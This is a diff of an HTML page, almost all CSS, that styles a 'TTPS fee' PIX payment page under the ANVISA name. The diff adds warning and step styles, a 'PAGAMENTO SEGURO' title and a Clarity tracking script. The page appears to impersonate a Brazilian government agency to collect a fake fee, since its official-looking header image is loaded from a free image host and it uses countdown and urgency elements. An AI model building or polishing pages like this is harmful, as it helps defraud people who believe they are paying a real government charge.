@@ -1,484 +1,302 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pagamento da Taxa TTPS | ANVISA</title>
-  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PAGAMENTO SEGURO | ANVISA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "r5wwtraiai");
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f8f9fa;
-    }
-    
-    .main-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: #1351b4;
-      margin-bottom: 8px;
-    }
-    
-    .subtitle {
-      font-size: 16px;
-      color: #666666;
-      margin-bottom: 24px;
-    }
-    
-    .sticky-header {
-      position: sticky;
-      top: 0;
-      background-color: white;
-      z-index: 50;
-      transition: box-shadow 0.3s ease;
-    }
-    
-    .sticky-header.shadow {
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    
-    .secure-badge {
-      display: inline-flex;
-      align-items: center;
-      background-color: #f0f7ff;
-      color: #1351b4;
-      padding: 6px 12px;
-      border-radius: 16px;
-      font-size: 12px;
-      font-weight: 600;
-    }
-    
-    .secure-badge i {
-      margin-right: 4px;
-    }
-    
-    .payment-container {
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-      overflow: hidden;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-    
-    .payment-header {
-      background-color: #f0f7ff;
-      padding: 20px;
-      border-bottom: 1px solid #e0e7ff;
-    }
-    
-    .payment-content {
-      padding: 30px;
-    }
-    
-    .payment-box {
-      background-color: #f9fafb;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 24px;
-      border: 1px solid #e5e7eb;
-    }
-    
-    .payment-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #1351b4;
-      margin-bottom: 16px;
-    }
-    
-    .payment-details {
-      margin-bottom: 16px;
-    }
-    
-    .payment-row {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 8px;
-      padding-bottom: 8px;
-      border-bottom: 1px dashed #e5e7eb;
-    }
-    
-    .payment-row:last-child {
-      border-bottom: none;
-      margin-bottom: 0;
-      padding-bottom: 0;
-    }
-    
-    .payment-label {
-      font-size: 14px;
-      color: #6b7280;
-    }
-    
-    .payment-value {
-      font-size: 14px;
-      font-weight: 500;
-      color: #4b5563;
-    }
-    
-    .payment-total {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 16px;
-      padding-top: 16px;
-      border-top: 1px solid #e5e7eb;
-    }
-    
-    .payment-total-label {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1f2937;
-    }
-    
-    .payment-total-value {
-      font-size: 16px;
-      font-weight: 700;
-      color: #1351b4;
-    }
-    
-    .pix-container {
-      border: 1px solid #e5e7eb;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 24px;
-      text-align: center;
-    }
-    
-    .pix-title {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1351b4;
-      margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    
-    .pix-title img {
-      width: 24px;
-      height: 24px;
-      margin-right: 8px;
-    }
-    
-    .pix-qrcode {
-      margin: 20px auto;
-      max-width: 200px;
-    }
-    
-    .pix-code {
-      background-color: #f9fafb;
-      border: 1px dashed #d1d5db;
-      border-radius: 4px;
-      padding: 12px;
-      font-family: monospace;
-      font-size: 14px;
-      color: #4b5563;
-      word-break: break-all;
-      margin-bottom: 16px;
-    }
-    
-    .pix-instructions {
-      text-align: left;
-      margin-bottom: 16px;
-    }
-    
-    .pix-instruction {
-      display: flex;
-      align-items: flex-start;
-      margin-bottom: 12px;
-    }
-    
-    .pix-instruction-number {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background-color: #1351b4;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: 600;
-      margin-right: 12px;
-      flex-shrink: 0;
-    }
-    
-    .pix-instruction-text {
-      font-size: 14px;
-      color: #4b5563;
-      flex-grow: 1;
-    }
-    
-    .btn {
-      padding: 12px 20px;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 16px;
-      transition: all 0.2s ease;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      width: 100%;
-    }
-    
-    .btn-primary {
-      background-color: #1351b4;
-      color: white;
-      border: none;
-    }
-    
-    .btn-primary:hover {
-      background-color: #0c3d8a;
-    }
-    
-    .btn-secondary {
-      background-color: #f3f4f6;
-      color: #4b5563;
-      border: 1px solid #d1d5db;
-      margin-top: 12px;
-    }
-    
-    .btn-secondary:hover {
-      background-color: #e5e7eb;
-    }
-    
-    .btn i {
-      margin-right: 8px;
-    }
-    
-    .timer-container {
-      background-color: #eff6ff;
-      border-radius: 8px;
-      padding: 16px;
-      margin-bottom: 24px;
-      border: 1px solid #bfdbfe;
-      text-align: center;
-    }
-    
-    .timer-title {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1e40af;
-      margin-bottom: 8px;
-    }
-    
-    .timer-text {
-      font-size: 14px;
-      color: #4b5563;
-      margin-bottom: 12px;
-    }
-    
-    .timer-countdown {
-      font-size: 24px;
-      font-weight: 700;
-      color: #1e40af;
-      font-family: monospace;
-    }
-    
-    .copy-button {
-      background-color: #1351b4;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      padding: 8px 12px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      transition: all 0.2s ease;
-    }
-    
-    .copy-button:hover {
-      background-color: #0c3d8a;
-    }
-    
-    .copy-button i {
-      margin-right: 6px;
-    }
-    
-    .vlibras-icon {
-      position: fixed;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      z-index: 1000;
-    }
-    
-    .payment-status {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    
-    .status-step {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      position: relative;
-      flex: 1;
-    }
-    
-    .status-step:not(:last-child)::after {
-      content: '';
-      position: absolute;
-      top: 12px;
-      right: calc(-50% + 12px);
-      width: calc(100% - 24px);
-      height: 2px;
-      background-color: #e5e7eb;
-      z-index: 0;
-    }
-    
-    .status-step.active:not(:last-child)::after {
-      background-color: #1351b4;
-    }
-    
-    .status-icon {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background-color: #e5e7eb;
-      color: #9ca3af;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      margin-bottom: 8px;
-      position: relative;
-      z-index: 1;
-    }
-    
-    .status-step.active .status-icon {
-      background-color: #1351b4;
-      color: white;
-    }
-    
-    .status-step.completed .status-icon {
-      background-color: #10b981;
-      color: white;
-    }
-    
-    .status-text {
-      font-size: 12px;
-      color: #6b7280;
-      text-align: center;
-    }
-    
-    .status-step.active .status-text {
-      color: #1351b4;
-      font-weight: 600;
-    }
-    
-    .status-step.completed .status-text {
-      color: #10b981;
-    }
-    
-    .loading-indicator {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-    }
-    
-    .loading-spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid rgba(0, 0, 0, 0.1);
-      border-radius: 50%;
-      border-top: 4px solid #1351b4;
-      animation: spin 1s linear infinite;
-      margin-bottom: 16px;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .loading-text {
-      font-size: 16px;
-      font-weight: 500;
-      color: #1351b4;
-    }
-    
-    /* Status de pagamento (inicialmente oculto) */
-    .payment-success, .payment-pending, .payment-error {
-      display: none;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 24px;
-      text-align: center;
-    }
-    
-    .payment-success {
-      background-color: #f0fdf4;
-      border: 1px solid #bbf7d0;
-    }
-    
-    .payment-pending {
-      background-color: #fffbeb;
-      border: 1px solid #fef3c7;
-    }
-    
-    .payment-error {
-      background-color: #fef2f2;
-      border: 1px solid #fecaca;
-    }
-    
-    .status-icon-large {
-      width: 60px;
-      height: 60px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      margin: 0 auto 16px;
-    }
-    
-    .payment-success .status-icon-large {
-      background-color: #dcfce7;
-      color: #16a34a;
-    }
-    
-    .payment-pending .status-icon-large {
-      background-color: #fef3c7;
-      color: #d97706;
-    }
-    
-    .payment-error .status-icon-large {
-      background-color: #fee2e2;
-      color: #dc2626;
-    }
-    
-    .status-title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-    
-    .payment-success .status-title {
-      color: #16a34a;
-    }
-    
-    .payment-pending .status-title {
-      color: #d97706;
-    }
-    
-    .payment-error .status-title {
-      color: #dc2626;
-    }
-    
-    .status-message {
-      font-size: 14px;
-      color: #4b5563;
-      margin-bottom: 16px;
-    }
-  </style>
-</head>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f8f9fa;
+      }
+
+      .main-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #1351b4;
+        margin-bottom: 8px;
+      }
+
+      .subtitle {
+        font-size: 16px;
+        color: #666666;
+        margin-bottom: 24px;
+      }
+
+      .sticky-header {
+        position: sticky;
+        top: 0;
+        background-color: white;
+        z-index: 50;
+        transition: box-shadow 0.3s ease;
+      }
+
+      .sticky-header.shadow {
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      }
+
+      .secure-badge {
+        display: inline-flex;
+        align-items: center;
+        background-color: #f0f7ff;
+        color: #1351b4;
+        padding: 6px 12px;
+        border-radius: 16px;
+        font-size: 12px;
+        font-weight: 600;
+      }
+
+      .secure-badge i {
+        margin-right: 4px;
+      }
+
+      .ttps-container {
+        background-color: white;
+        border-radius: 12px;
+        box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        overflow: hidden;
+        max-width: 700px;
+        margin: 0 auto;
+      }
+
+      .ttps-header {
+        background-color: #ffedd5;
+        padding: 20px;
+        border-bottom: 1px solid #fed7aa;
+      }
+
+      .ttps-content {
+        padding: 30px;
+      }
+
+      .ttps-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #c2410c;
+        margin-bottom: 16px;
+      }
+
+      .ttps-description {
+        font-size: 16px;
+        color: #4b5563;
+        margin-bottom: 20px;
+        line-height: 1.6;
+      }
+
+      .ttps-info-box {
+        background-color: #fff7ed;
+        border: 1px solid #fed7aa;
+        border-left: 4px solid #f97316;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 24px;
+      }
+
+      .ttps-info-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: #c2410c;
+        margin-bottom: 8px;
+        display: flex;
+        align-items: center;
+      }
+
+      .ttps-info-title i {
+        margin-right: 8px;
+        color: #f97316;
+      }
+
+      .ttps-warning {
+        background-color: #fef2f2;
+        border: 1px solid #fecaca;
+        border-left: 4px solid #ef4444;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 24px;
+      }
+
+      .ttps-warning-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: #b91c1c;
+        margin-bottom: 8px;
+        display: flex;
+        align-items: center;
+      }
+
+      .ttps-warning-title i {
+        margin-right: 8px;
+        color: #ef4444;
+      }
+
+      .ttps-warning-text {
+        font-size: 14px;
+        color: #4b5563;
+        line-height: 1.5;
+      }
+
+      .ttps-steps {
+        margin-bottom: 24px;
+      }
+
+      .ttps-step {
+        display: flex;
+        margin-bottom: 16px;
+        align-items: flex-start;
+      }
+
+      .ttps-step-number {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background-color: #f97316;
+        color: white;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        font-weight: 600;
+        margin-right: 12px;
+        flex-shrink: 0;
+      }
+
+      .ttps-step-content {
+        flex-grow: 1;
+      }
+
+      .ttps-step-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: #1f2937;
+        margin-bottom: 4px;
+      }
+
+      .ttps-step-description {
+        font-size: 14px;
+        color: #4b5563;
+        line-height: 1.5;
+      }
+
+      .payment-box {
+        background-color: #f9fafb;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 24px;
+        border: 1px solid #e5e7eb;
+      }
+
+      .payment-title {
+        font-size: 18px;
+        font-weight: 600;
+        color: #1351b4;
+        margin-bottom: 16px;
+      }
+
+      .payment-details {
+        margin-bottom: 16px;
+      }
+
+      .payment-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 8px;
+        padding-bottom: 8px;
+        border-bottom: 1px dashed #e5e7eb;
+      }
+
+      .payment-row:last-child {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
+      }
+
+      .payment-label {
+        font-size: 14px;
+        color: #6b7280;
+      }
+
+      .payment-value {
+        font-size: 14px;
+        font-weight: 500;
+        color: #4b5563;
+      }
+
+      .payment-total {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 16px;
+        padding-top: 16px;
+        border-top: 1px solid #e5e7eb;
+      }
+
+      .payment-total-label {
+        font-size: 16px;
+        font-weight: 600;
+        color: #1f2937;
+      }
+
+      .payment-total-value {
+        font-size: 16px;
+        font-weight: 700;
+        color: #1351b4;
+      }
+
+      .btn {
+        padding: 12px 20px;
+        border-radius: 6px;
+        font-weight: 600;
+        font-size: 16px;
+        transition: all 0.2s ease;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        width: 100%;
+      }
+
+      .btn-primary {
+        background-color: #ea580c;
+        color: white;
+        border: none;
+      }
+
+      .btn-primary:hover {
+        background-color: #c2410c;
+      }
+
+      .btn-secondary {
+        background-color: #f3f4f6;
+        color: #4b5563;
+        border: 1px solid #d1d5db;
+        margin-top: 12px;
+      }
+
+      .btn-secondary:hover {
+        background-color: #e5e7eb;
+      }
+
+      .btn i {
+        margin-right: 8px;
+      }
+
+      .vlibras-icon {
+        position: fixed;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        z-index: 1000;
+      }
+    </style>
+  </head>
 <body>
   <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
   <div class="sticky-header">
